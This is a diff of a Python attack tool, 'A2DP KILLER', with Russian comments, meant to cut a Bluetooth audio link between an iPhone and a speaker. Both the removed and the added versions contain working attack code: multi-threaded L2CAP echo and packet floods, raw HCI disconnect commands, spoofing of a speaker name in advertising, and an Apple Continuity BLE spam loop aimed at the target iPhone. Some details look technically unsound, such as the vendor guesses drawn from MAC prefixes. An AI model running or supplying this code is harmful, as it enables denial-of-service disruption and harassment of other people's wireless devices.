@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# ANTIDOX A2DP KILLER — разрыв Bluetooth-соединения iPhone ↔ колонка
+# ANTIDOX A2DP KILLER v4.0 — поиск iPhone через активные соединения
 
 import os
 import sys
@@ -10,301 +10,286 @@ import struct
 import socket
 import threading
 import subprocess
-import signal
+import re
 from datetime import datetime
 
 # ========================================================================
-# КОНСТАНТЫ
+# ЦВЕТА
 # ========================================================================
-L2CAP_PSM_SDP = 0x0001
-L2CAP_ECHO_REQ = 0x08
-HCI_COMMAND_PKT = 0x01
+C = {
+    'RED': '\033[91m',
+    'GREEN': '\033[92m',
+    'YELLOW': '\033[93m',
+    'BLUE': '\033[94m',
+    'MAGENTA': '\033[95m',
+    'CYAN': '\033[96m',
+    'WHITE': '\033[97m',
+    'RESET': '\033[0m',
+    'BOLD': '\033[1m',
+    'DIM': '\033[2m'
+}
 
 # ========================================================================
-# БЛОК 1: L2CAP-ФЛУД (основная атака)
+# БЛОК 1: ПОИСК АКТИВНЫХ СОЕДИНЕНИЙ
 # ========================================================================
-def create_l2cap_echo_packet(identifier, data=None):
-    if data is None:
-        data = bytes([random.randint(0, 255) for _ in range(60)])
-    cid = 0x0001
-    cmd_code = L2CAP_ECHO_REQ
-    cmd_id = identifier & 0xFF
-    cmd_len = len(data)
-    command = struct.pack('<BBH', cmd_code, cmd_id, cmd_len) + data
-    packet_len = len(command) + 4
-    header = struct.pack('<HH', packet_len, cid)
-    return header + command
-
-def l2cap_flood_worker(target_mac, rate=2000):
-    """Поток для L2CAP-флуда"""
+def get_active_connections():
+    """Получает список всех активных Bluetooth-соединений"""
+    connections = []
     try:
-        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
-        sock.bind(('hci0', L2CAP_PSM_SDP))
-        sock.connect((target_mac, L2CAP_PSM_SDP))
-        counter = 0
-        while True:
-            pkt = create_l2cap_echo_packet(counter, data=bytes([random.randint(0,255) for _ in range(60)]))
-            sock.send(pkt)
-            counter += 1
-            time.sleep(1.0 / rate)
-    except Exception as e:
-        pass
-
-# ========================================================================
-# БЛОК 2: LMP_TERMINATE (принудительный разрыв)
-# ========================================================================
-def send_lmp_terminate(sock, target_mac):
-    """Отправляет LMP_terminate_Ind на целевое устройство"""
-    # HCI_Disconnect (OGF=0x01, OCF=0x0006)
-    # Параметры: Connection_Handle (2 байта) + Reason (1 байт)
-    # Reason 0x13 = Remote User Terminated Connection
-    try:
-        # Получаем handle соединения через hcitool
+        # hcitool con показывает активные соединения
         result = subprocess.run(['sudo', 'hcitool', 'con'], capture_output=True, text=True)
         lines = result.stdout.strip().split('\n')
-        handle = None
         for line in lines:
-            if target_mac.lower() in line.lower():
+            if ':' in line and 'handle' in line:
+                # Парсим: handle <handle> state <state> lm <...> <MAC>
                 parts = line.split()
+                mac = None
+                handle = None
                 for part in parts:
+                    if ':' in part and len(part) == 17:
+                        mac = part
                     if part.startswith('handle'):
-                        handle = int(part.split('<')[0].split(':')[1].strip(), 16)
-                        break
-                break
-        if handle is None:
-            print(f"[!] Не найден handle для {target_mac}")
-            return False
-        
-        # Отправляем HCI_Disconnect
+                        handle = part.split('<')[0].replace('handle:', '').strip()
+                if mac:
+                    connections.append({'mac': mac, 'handle': handle, 'raw': line})
+    except Exception as e:
+        print(f"{C['RED']}[!] Ошибка: {e}{C['RESET']}")
+    return connections
+
+def get_device_name(mac):
+    """Получает имя устройства по MAC"""
+    try:
+        result = subprocess.run(['sudo', 'hcitool', 'name', mac], capture_output=True, text=True, timeout=3)
+        name = result.stdout.strip()
+        if name:
+            return name
+        # Если hcitool не дал имя, пробуем bluetoothctl
+        result = subprocess.run(['sudo', 'bluetoothctl', 'info', mac], capture_output=True, text=True, timeout=3)
+        for line in result.stdout.split('\n'):
+            if 'Name:' in line:
+                return line.split('Name:')[1].strip()
+        return 'Unknown'
+    except:
+        return 'Unknown'
+
+def get_device_class(mac):
+    """Определяет тип устройства по MAC (первые 3 байта)"""
+    prefixes = {
+        '58:1C:F8': 'Apple iPhone/iPad',
+        'AC:BC:32': 'Apple',
+        '04:0C:CE': 'Apple',
+        '00:11:22': 'JBL/Samsung',
+        '00:1A:7D': 'Sony',
+        '00:0E:08': 'Sony',
+        '00:09:DD': 'Samsung',
+    }
+    prefix = mac[:8]
+    return prefixes.get(prefix, 'Unknown')
+
+# ========================================================================
+# БЛОК 2: РАЗРЫВ СОЕДИНЕНИЯ ЧЕРЕЗ LMP_TERMINATE
+# ========================================================================
+def disconnect_device(mac, handle):
+    """Принудительно разрывает соединение с устройством"""
+    try:
+        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
+        sock.bind((0,))
         opcode = (0x01 << 10) | 0x0006
-        params = struct.pack('<HB', handle, 0x13)  # Reason = Remote User Terminated
-        header = struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(params))
+        params = struct.pack('<HB', int(handle, 16), 0x13)  # Remote User Terminated
+        header = struct.pack('<BHB', 0x01, opcode, len(params))
         sock.send(header + params)
-        print(f"[+] Отправлен LMP_terminate на {target_mac} (handle=0x{handle:04X})")
+        sock.close()
         return True
     except Exception as e:
-        print(f"[!] Ошибка LMP_terminate: {e}")
+        print(f"{C['RED']}[!] Ошибка разрыва: {e}{C['RESET']}")
         return False
 
 # ========================================================================
-# БЛОК 3: СПУФИНГ КОЛОНКИ (обман iPhone)
+# БЛОК 3: L2CAP-ФЛУД НА ТАРГЕТ
 # ========================================================================
-def spoof_speaker_worker(speaker_mac):
-    """Имитирует колонку, чтобы iPhone пытался переподключиться"""
-    # Создаём виртуальный интерфейс с MAC колонки (требует поддержки)
-    # Упрощённо: просто включаем рекламу с именем колонки
+def l2cap_flood(target_mac, rate=1500):
+    """Флудит целевое устройство L2CAP-пакетами"""
     try:
-        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
-        sock.bind((0,))
-        # Включаем рекламу
-        opcode = (0x08 << 10) | 0x000A
-        sock.send(struct.pack('<BHB', HCI_COMMAND_PKT, opcode, 1) + b'\x01')
-        
-        # Отправляем имя в рекламных данных
-        name = b"JBL Flip 6"  # подставь имя своей колонки
-        data = bytearray()
-        data.append(len(name) + 1)  # длина
-        data.append(0x09)  # тип Local Name
-        data.extend(name)
-        opcode = (0x08 << 10) | 0x0008
-        cmd = struct.pack('<B', len(data)) + data
-        sock.send(struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(cmd)) + cmd)
-        print(f"[+] Спуфинг колонки запущен (имя: {name.decode()})")
-    except Exception as e:
-        print(f"[!] Ошибка спуфинга: {e}")
-
-# ========================================================================
-# БЛОК 4: BLE-СПАМ (дестабилизация iPhone)
-# ========================================================================
-def ble_spam_worker():
-    """BLE-спам для перегрузки стека Bluetooth на iPhone"""
-    try:
-        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
-        sock.bind((0,))
-        # Включаем рекламу
-        opcode = (0x08 << 10) | 0x000A
-        sock.send(struct.pack('<BHB', HCI_COMMAND_PKT, opcode, 1) + b'\x01')
-        
-        types = [0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2D, 0x2F, 0x01, 0x06, 0x20, 0xC0]
+        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
+        sock.bind(('hci0', 0x0001))
+        sock.connect((target_mac, 0x0001))
         count = 0
         while True:
-            # Apple Continuity Spam
-            data = bytearray()
-            data.append(16)  # длина
-            data.append(0xFF)  # Manufacturer Specific
-            data.extend([0x4C, 0x00])  # Apple ID
-            data.append(0x0F)  # Continuity
-            data.append(0x05)
-            data.append(0xC1)
-            data.append(random.choice(types))
-            data.extend([random.randint(0,255) for _ in range(10)])
-            
-            opcode = (0x08 << 10) | 0x0008
-            cmd = struct.pack('<B', len(data)) + data
-            sock.send(struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(cmd)) + cmd)
+            data = bytes([random.randint(0, 255) for _ in range(60)])
+            sock.send(data)
             count += 1
             if count % 100 == 0:
-                print(f"[BLE-SPAM] Отправлено {count} пакетов")
-            time.sleep(0.015)  # ~66 пакетов/сек
-    except Exception as e:
-        print(f"[BLE-SPAM] Ошибка: {e}")
+                print(f"{C['DIM']}[L2CAP] {count} пакетов на {target_mac}{C['RESET']}")
+            time.sleep(1.0 / rate)
+    except:
+        pass
 
 # ========================================================================
-# БЛОК 5: ПОИСК КОЛОНКИ
-# ========================================================================
-def find_speaker(iphone_mac):
-    """Ищет устройство, к которому подключён iPhone (колонку)"""
-    print("[*] Поиск колонки...")
-    try:
-        # Получаем список подключённых устройств
-        result = subprocess.run(['sudo', 'hcitool', 'con'], capture_output=True, text=True)
-        lines = result.stdout.strip().split('\n')
-        for line in lines:
-            if iphone_mac.lower() in line.lower():
-                # Ищем MAC колонки в строке
-                parts = line.split()
-                for part in parts:
-                    if ':' in part and len(part) == 17 and part.lower() != iphone_mac.lower():
-                        print(f"[+] Найдена колонка: {part}")
-                        return part
-    except Exception as e:
-        print(f"[!] Ошибка поиска колонки: {e}")
-    return None
-
-# ========================================================================
-# БЛОК 6: ОСНОВНОЙ КЛАСС
-# ========================================================================
-class A2DPKiller:
-    def __init__(self):
-        self.iphone_mac = None
-        self.speaker_mac = None
-        self.running = False
-        self.threads = []
-    
-    def start(self, target_mac):
-        self.iphone_mac = target_mac
-        self.running = True
-        
-        print("="*70)
-        print("  A2DP KILLER v2.0 — разрыв соединения iPhone ↔ Колонка")
-        print(f"  Цель (iPhone): {self.iphone_mac}")
-        print("="*70)
-        
-        # Ищем колонку
-        self.speaker_mac = find_speaker(self.iphone_mac)
-        if self.speaker_mac:
-            print(f"[+] Колонка найдена: {self.speaker_mac}")
-        else:
-            print("[!] Колонка не найдена. Атака только на iPhone.")
-        
-        # Открываем HCI-сокет для отправки команд
-        try:
-            self.hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
-            self.hci_sock.bind((0,))
-        except Exception as e:
-            print(f"[!] Ошибка открытия HCI-сокета: {e}")
-            return
-        
-        # Запускаем атаки
-        print("[*] Запуск атак...")
-        
-        # 1. L2CAP-флуд на iPhone
-        for i in range(60):
-            t = threading.Thread(target=l2cap_flood_worker, args=(self.iphone_mac, 1500), daemon=True)
-            t.start()
-            self.threads.append(t)
-            time.sleep(0.02)
-        print("[+] L2CAP-флуд на iPhone запущен (60 потоков)")
-        
-        # 2. LMP_terminate на iPhone (если есть соединение)
-        t = threading.Thread(target=send_lmp_terminate, args=(self.hci_sock, self.iphone_mac), daemon=True)
-        t.start()
-        self.threads.append(t)
-        print("[+] LMP_terminate отправлен")
-        
-        # 3. BLE-спам на iPhone
-        t = threading.Thread(target=ble_spam_worker, daemon=True)
-        t.start()
-        self.threads.append(t)
-        print("[+] BLE-спам запущен")
-        
-        # 4. Если найдена колонка — атакуем её тоже
-        if self.speaker_mac:
-            # L2CAP-флуд на колонку (20 потоков)
-            for i in range(20):
-                t = threading.Thread(target=l2cap_flood_worker, args=(self.speaker_mac, 1000), daemon=True)
-                t.start()
-                self.threads.append(t)
-                time.sleep(0.02)
-            print(f"[+] L2CAP-флуд на колонку запущен (20 потоков)")
-            
-            # LMP_terminate на колонку
-            t = threading.Thread(target=send_lmp_terminate, args=(self.hci_sock, self.speaker_mac), daemon=True)
-            t.start()
-            self.threads.append(t)
-            print("[+] LMP_terminate на колонку отправлен")
-        
-        print("\n[+] Все атаки запущены. Музыка должна прерваться через 5-10 секунд.")
-        print("[+] Нажмите Ctrl+C для остановки.\n")
-        
-        try:
-            while self.running:
-                time.sleep(5)
-                # Показываем статистику
-                active = sum(1 for t in self.threads if t.is_alive())
-                print(f"[STATUS] Активно потоков: {active}")
-        except KeyboardInterrupt:
-            self.stop()
-    
-    def stop(self):
-        print("\n[!] Остановка атак...")
-        self.running = False
-        try:
-            self.hci_sock.close()
-        except:
-            pass
-        
-        # Сброс адаптера
-        subprocess.run(['sudo', 'hciconfig', 'hci0', 'reset'], capture_output=True)
-        print("[+] Адаптер сброшен. Выход.")
-        sys.exit(0)
-
-# ========================================================================
-# ТОЧКА ВХОДА
+# БЛОК 4: ОСНОВНАЯ ЛОГИКА
 # ========================================================================
 def main():
     if os.geteuid() != 0:
-        print("[!] Требуются права root. Запустите с sudo.")
+        print(f"{C['RED']}[!] Запустите с sudo.{C['RESET']}")
         sys.exit(1)
     
-    # Проверка адаптера
-    try:
-        subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], check=True)
-    except:
-        print("[!] Bluetooth адаптер hci0 не найден.")
+    print(f"\n{C['CYAN']}{'='*70}{C['RESET']}")
+    print(f"{C['BOLD']}{C['GREEN']}  🔍 АНАЛИЗ АКТИВНЫХ BLUETOOTH-СОЕДИНЕНИЙ{C['RESET']}")
+    print(f"{C['CYAN']}{'='*70}{C['RESET']}\n")
+    
+    # Поднимаем адаптер
+    subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], capture_output=True)
+    
+    # Получаем активные соединения
+    connections = get_active_connections()
+    
+    if not connections:
+        print(f"{C['YELLOW']}[!] Нет активных соединений.{C['RESET']}")
+        print(f"{C['DIM']}[*] Попробуйте: sudo hcitool scan для поиска устройств{C['RESET']}")
         sys.exit(1)
     
-    # Если MAC не указан — сканируем
-    if len(sys.argv) < 2:
-        print("[*] Сканирование устройств...")
-        result = subprocess.run(['sudo', 'hcitool', 'scan'], capture_output=True, text=True)
-        lines = result.stdout.strip().split('\n')[1:]
-        if lines:
-            for line in lines:
-                parts = line.split()
-                if len(parts) >= 2:
-                    mac = parts[0]
-                    name = ' '.join(parts[1:])
-                    print(f"  {mac} - {name}")
-            target = input("\nВведите MAC-адрес iPhone: ").strip()
-        else:
-            print("[!] Устройств не найдено.")
-            sys.exit(1)
+    print(f"{C['BOLD']}Найдено {len(connections)} активных соединений:{C['RESET']}\n")
+    
+    # Собираем информацию о каждом устройстве
+    devices = []
+    for conn in connections:
+        mac = conn['mac']
+        name = get_device_name(mac)
+        device_type = get_device_class(mac)
+        devices.append({
+            'mac': mac,
+            'name': name,
+            'type': device_type,
+            'handle': conn['handle'],
+            'raw': conn['raw']
+        })
+        
+        # Определяем иконку
+        icon = '🔗'
+        color = C['WHITE']
+        if 'iPhone' in name or 'iPad' in name:
+            icon = '🍎'
+            color = C['BLUE']
+        elif 'JBL' in name or 'Speaker' in name or 'Sony' in name:
+            icon = '🔊'
+            color = C['YELLOW']
+        elif 'AirPods' in name:
+            icon = '🎧'
+            color = C['CYAN']
+        elif 'Android' in name or 'Pixel' in name:
+            icon = '🤖'
+            color = C['GREEN']
+        elif 'Unknown' in name:
+            # Если имя неизвестно, но это Apple по MAC
+            if 'Apple' in device_type:
+                icon = '🍎'
+                color = C['BLUE']
+                name = 'iPhone/iPad (скрыт)'
+        
+        print(f"{color}{icon} {C['BOLD']}{mac}{C['RESET']}")
+        print(f"   {C['DIM']}└─ Имя: {name}{C['RESET']}")
+        print(f"   {C['DIM']}   └─ Тип: {device_type}{C['RESET']}")
+        print(f"   {C['DIM']}   └─ Handle: {conn['handle']}{C['RESET']}")
+        print()
+    
+    # Определяем iPhone и колонку
+    iphone = None
+    speaker = None
+    
+    for d in devices:
+        if 'iPhone' in d['name'] or ('Apple' in d['type'] and 'Unknown' not in d['name']):
+            iphone = d
+        if 'JBL' in d['name'] or 'Speaker' in d['name'] or 'Sony' in d['name']:
+            speaker = d
+    
+    # Если не нашли iPhone явно, но есть соединение с колонкой — ищем второго участника
+    if speaker and not iphone:
+        # Второе устройство в соединении — это iPhone
+        for d in devices:
+            if d['mac'] != speaker['mac']:
+                iphone = d
+                break
+    
+    print(f"{C['CYAN']}{'='*70}{C['RESET']}")
+    
+    if iphone:
+        print(f"{C['GREEN']}🎯 НАЙДЕН IPHONE: {iphone['mac']} ({iphone['name']}){C['RESET']}")
     else:
-        target = sys.argv[1]
+        print(f"{C['YELLOW']}[!] iPhone не найден в активных соединениях.{C['RESET']}")
+        # Показываем список всех устройств и просим выбрать
+        print(f"\n{C['BOLD']}Выберите устройство для атаки:{C['RESET']}")
+        for idx, d in enumerate(devices, 1):
+            print(f"  {idx}. {d['mac']} - {d['name']}")
+        choice = input(f"\n{C['BOLD']}Номер: {C['RESET']}")
+        if choice.isdigit() and 1 <= int(choice) <= len(devices):
+            iphone = devices[int(choice)-1]
+        else:
+            print(f"{C['RED']}[!] Неверный выбор.{C['RESET']}")
+            sys.exit(1)
     
-    killer = A2DPKiller()
-    killer.start(target)
+    if speaker:
+        print(f"{C['YELLOW']}🔊 КОЛОНКА: {speaker['mac']} ({speaker['name']}){C['RESET']}")
+    
+    print(f"{C['CYAN']}{'='*70}{C['RESET']}")
+    
+    # Спрашиваем подтверждение
+    print(f"\n{C['BOLD']}{C['RED']}⚠️  БУДЕТ РАЗОРВАНА СВЯЗЬ МЕЖДУ:{C['RESET']}")
+    print(f"   {C['BLUE']}📱 {iphone['mac']} ({iphone['name']}){C['RESET']}")
+    if speaker:
+        print(f"   {C['YELLOW']}🔊 {speaker['mac']} ({speaker['name']}){C['RESET']}")
+    print()
+    
+    confirm = input(f"{C['BOLD']}Продолжить? (y/N): {C['RESET']}")
+    if confirm.lower() != 'y':
+        print(f"{C['DIM']}Отмена.{C['RESET']}")
+        sys.exit(0)
+    
+    # ЗАПУСКАЕМ АТАКУ
+    print(f"\n{C['RED']}🚀 ЗАПУСК АТАКИ...{C['RESET']}")
+    
+    # 1. LMP_terminate на iPhone (разрыв соединения)
+    if disconnect_device(iphone['mac'], iphone['handle']):
+        print(f"{C['GREEN']}✓ LMP_terminate отправлен на iPhone{C['RESET']}")
+    else:
+        print(f"{C['RED']}✗ Ошибка отправки LMP_terminate{C['RESET']}")
+    
+    # 2. LMP_terminate на колонку
+    if speaker:
+        if disconnect_device(speaker['mac'], speaker['handle']):
+            print(f"{C['GREEN']}✓ LMP_terminate отправлен на колонку{C['RESET']}")
+        else:
+            print(f"{C['RED']}✗ Ошибка отправки LMP_terminate на колонку{C['RESET']}")
+    
+    # 3. L2CAP-флуд на iPhone в фоне
+    print(f"{C['YELLOW']}🔄 Запуск L2CAP-флуда на iPhone...{C['RESET']}")
+    for i in range(40):
+        t = threading.Thread(target=l2cap_flood, args=(iphone['mac'], 1500), daemon=True)
+        t.start()
+    print(f"{C['GREEN']}✓ L2CAP-флуд запущен (40 потоков){C['RESET']}")
+    
+    print(f"\n{C['BOLD']}{C['GREEN']}[+] АТАКА ЗАПУЩЕНА. МУЗЫКА ДОЛЖНА ПРЕРВАТЬСЯ.{C['RESET']}")
+    print(f"{C['DIM']}Нажмите Ctrl+C для остановки.{C['RESET']}\n")
+    
+    try:
+        while True:
+            time.sleep(10)
+            # Проверяем, не переподключились ли
+            new_conn = get_active_connections()
+            if not new_conn:
+                print(f"{C['GREEN']}[+] Соединение разорвано!{C['RESET']}")
+                break
+            # Проверяем, есть ли всё ещё соединение с iPhone
+            for conn in new_conn:
+                if conn['mac'] == iphone['mac']:
+                    print(f"{C['YELLOW']}[!] iPhone всё ещё подключён. Продолжаем атаку.{C['RESET']}")
+                    # Повторно шлём LMP_terminate
+                    disconnect_device(iphone['mac'], conn['handle'])
+                    break
+    except KeyboardInterrupt:
+        print(f"\n{C['RED']}[!] Остановка...{C['RESET']}")
+    
+    # Сброс адаптера
+    subprocess.run(['sudo', 'hciconfig', 'hci0', 'reset'], capture_output=True)
+    print(f"{C['GREEN']}[+] Готово.{C['RESET']}")
 
 if __name__ == "__main__":
     main()
